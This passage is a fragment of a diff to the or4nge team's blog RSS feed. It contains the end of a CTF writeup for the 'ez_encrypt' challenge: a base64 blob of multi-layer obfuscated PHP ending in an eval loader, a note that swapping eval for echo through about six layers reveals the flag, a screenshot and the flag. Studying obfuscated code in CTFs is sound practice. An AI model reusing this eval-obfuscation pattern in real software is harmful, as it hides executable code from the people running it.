LanBWMW1laEJTVmhtanlPMmFUUlZjZU5aNVpjMDU1Tk5rTlNtMU5SbXJOYzBzMVYwVkFzb2h2c3dqVmh2dW5OVmhFU1ZzZXptak5wMGtlc1ZHQWkyRTZGd3VWTnZ1NU9va05TdlNhU0pFQkZtazFpQnVUUE5qbmJtQlZjM1dLc0tqcFYxbUF6SkVTaDN1SE5Cemh5c0JuenZyWmJzR0tGMFNEQzFXa08zVnRoS0UxVkRqVFZFU0pHMmFOYnZyT05pU1RwMGFKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc0Yya2pSbXJKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc2ltU0ZSRWtmR2RTc1ZaMUFpbVNGcEVrTVZEak5jVkVRRlp6cHMxVnFzRGhHUEx6M2ltU0ZSRWtmR2RTc1ZaMUFGMVNJUm05M0hpMGd0Rlo3SEs0PSI7ZXZhbCgnPz4nLiRhckNpQ0woJFZ2VXJCWigkREVvbUtrKCRWQ0JaUVcsJExucG52WSoyKSwkREVvbUtrKCRWQ0JaUVcsJExucG52WSwkTG5wbnZZKSwkREVvbUtrKCRWQ0JaUVcsMCwkTG5wbnZZKSkpKTs=&amp;quot;));?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;硬解 eval变echo的 差不多解个6层&lt;/p&gt;
+&lt;p&gt;最后可以getflag&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 197; 
+			flex-basis: 473px&#34;
+	&gt;
+	&lt;a href=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/ez_encrypt_getflag.png&#34; data-size=&#34;1270x644&#34;&gt;
+		&lt;img src=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/ez_encrypt_getflag.png&#34;
+			width=&#34;1270&#34;
+			height=&#34;644&#34;
+			srcset=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/ez_encrypt_getflag_hu9a63b04e754f94ce012b7cf54cc6c5c6_215646_480x0_resize_box_3.png 480w, https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/ez_encrypt_getflag_hu9a63b04e754f94ce012b7cf54cc6c5c6_215646_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;flag:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cazy{PHP_ji4m1_1s_s00000_3aSyyyyyyyyyyy}
+&lt;/code&gt;&lt;/pre&gt;</description>
+        </item>
+        <item>
         <title>SCTF2021 Writeup by or4nge</title>
         <link>https://or4ngesec.github.io/post/sctf2021-writeup-by-or4nge/</link>
         <pubDate>Tue, 28 Dec 2021 16:23:17 +0800</pubDate>
